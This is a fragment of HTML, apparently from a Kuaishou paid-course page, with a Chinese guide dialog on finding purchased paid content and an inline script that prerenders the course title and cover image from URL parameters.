            </h2> <div class="sp-dialog__body"><div data-v-bd609f0e="" class="guide"><div data-v-bd609f0e="" class="subtitle">如何找到购买的付费内容</div><div data-v-bd609f0e="" class="text">1.【快手首页左上角】-【打开侧边栏】</div><img data-v-bd609f0e="" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/img/guideDialog1.d94e44b6ec70ee045f34d7533f59881d.png" class="img"><div data-v-bd609f0e="" class="text">2.点击【更多】</div><img data-v-bd609f0e="" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/img/guideDialog2.56314112621425d23d9ff9e153c3c4cc.png" class="img"><div data-v-bd609f0e="" class="text">
            3.左下角找到【编辑】，选择【付费内容】/【付费精选】后，点【加号】再点击【完成】加入侧边栏
        </div><img data-v-bd609f0e="" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/img/guideDialog3.8b060e780270f2bb33b42b0c0cc5fd60.png" class="img"><div data-v-bd609f0e="" class="text">
            4.进入【付费内容】/【付费精选】，查看底部【我购买的】
        </div><img data-v-bd609f0e="" src="https://tx-ec.static.yximgs.com/udata/pkg/vision/assets/vision/img/guideDialog4.9296c0c83f0574e94a2d6c7b20a61616.png" class="img"></div><div data-v-bd609f0e="" class="mask"><img data-v-bd609f0e="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALBAMAAABbgmoVAAAAHlBMVEUAAACcnJydnZ2enp6cnJycnJycnJybm5uioqKcnJyxbRAzAAAACXRSTlMAzdlE87StRRYNq/TJAAAAI0lEQVQI12NAA40MDGZAikmAeQKIq1gJFmR1wBRkYHVA1wwAtGQEd2Xfgl4AAAAHdEVYdG1pbTpjbGkAAAAAAAAAAElFTkSuQmCC" class="mask-icon"></div></div> <footer class="sp-dialog__actions"><a role="button">不再提醒</a><a role="button">关闭</a></footer></div></div></div></div></div></div><div data-v-5c2d1660="" data-v-4309bf1a="" class="pendant-root"></div></div><script>try {
                if (/^\/detail\/\d+/.test(location.pathname) && /coverImg/.test(location.search)) {
                    window.prerender.innerHTML =
                        ' \
            <section style="height: 62.67vw"> \
              <img id="prerenderImg" style="display: block;width: 100%;height: 100%;object-fit: cover;"> \
            </section> \
            <section style="border-bottom: 3.2vw solid #f6f6f6;font-size: 5.33vw;padding: 3.86vw 4.58vw;"> \
              <div style="font-size: 4.83vw;font-weight: bold;color: #000;line-height: 7.47vw;" id="prerenderTitle"></div> \
              <div style="margin-top: 2.13vw;height: 5.33vw;"></div> \
            </section> \
            <section style="border-bottom: 3.2vw solid #f6f6f6;padding: 5.33vw 4.27vw 2.13vw"> \
              <h3 style="font-weight: bold;margin: 0 0 4.27vw 0;font-size: 4.27vw;color: #000;line-height: 4.8vw"> \
                课程简介 \
              </h3> \
            </section> \
            <section style="min-height: 500px;border-bottom: 3.2vw solid #f6f6f6;padding: 5.33vw 0 0"> \
              <h3 style="font-weight: bold;padding-left: 4.27vw;font-size: 4.27vw;color: #000;line-height: 4.8vw">课程</h3> \
            </section>';
                    var params = {};
                    var hasCover = false;
                    var hasName = false;
                    location.search
                        .slice(1)
                        .split('&')
                        .reduce(function(s, a) {
                            var m = a.split('=');
                            var k = m[0];
                            var v = decodeURIComponent(m[1]);
                            s[k] = v;
                            return s;
                        }, params);
                    if (params.courseName) {
                        try {
                            params.courseName = decodeURIComponent(params.courseName);
                            hasName = true;
                        } catch (error) {}
                        window.prerenderTitle.textContent = params.courseName;
                    }
                    if (params.coverImg) {
                        var coverImg = decodeURIComponent(params.coverImg);
                        if (/^https?:\/\/[^/]+\.yximgs\.com\//.test(coverImg)) {
                            window.prerenderImg.src = coverImg;
                            window.detailCoverImg = coverImg;
                            hasCover = true;
                            window.prerenderImg.addEventListener('load', function() {
                                if (hasCover && hasName) {
                                    window._loadPreRenderTime = new Date();
                                }
                            });
                        }
                    }
                } else {
                    window.prerender.parentElement.removeChild(window.prerender);
                }
            } catch (error) {
                window.prerender.parentElement.removeChild(window.prerender);
            }</script>
<div id="qbTrans-pageTrans-dialog" style="display: none;"><!----> <span class="qbTrans-pageTrans-dialog-success" style="display: none;"></span> <span class="qbTrans-pageTrans-dialog-guide" style="display: none;"></span> <span class="qbTrans-pageTrans-dialog-text">是否将当前网页翻译成中文</span> <div id="qbTrans-pageTrans-dialog-btn" class="qbTrans-pageTrans-dialog-btn">网页翻译</div> <div class="qbTrans-pageTrans-dialog-btn-empty">中中对照</div> <!----> <div class="qbTrans-pageTrans-dialog-close"><span class="qbTrans-pageTrans-dialog-close-text">关闭</span></div></div></body></html>